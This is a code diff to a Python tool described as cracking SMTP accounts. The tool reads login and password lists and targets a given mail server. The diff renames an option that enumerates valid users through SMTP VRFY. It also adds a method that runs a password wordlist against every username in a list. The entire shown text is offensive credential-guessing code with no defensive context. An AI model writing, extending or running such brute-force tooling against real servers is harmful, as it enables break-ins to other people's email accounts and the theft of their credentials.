@@ -22,7 +22,7 @@ argparser = argparse.ArgumentParser(description='Crack SMTP accounts')
 argparser.add_argument('-l', '--logins', help='File list of accounts', required=True)
 argparser.add_argument('-p', '--passwords', help='File list of passwords', required=True)
 argparser.add_argument('-s', '--server', help='SMTP server', required=True)
-argparser.add_argument('--verify', help='Verify accounts, this option use SMTP VRFY ... but Many sites disable SMTP VRFY in order to foil spammers.', action='store_true')
+argparser.add_argument('--verify-users', help='Verify accounts, this option use SMTP VRFY ... but Many sites disable SMTP VRFY in order to foil spammers.', action='store_true')
 
 
 class SMTP_Bruter(object):
@@ -81,3 +81,11 @@ class SMTP_Bruter(object):
                 print ('[-] User: %s is not valid' % user)
                 
         return False
+    
+    def brute_force_users(self, usernameslist, wordlist):
+        for user in usernameslist:
+            user = user.strip('\n')
+            if self.brute_force(user, wordlist):
+                return True
+        return False
+    
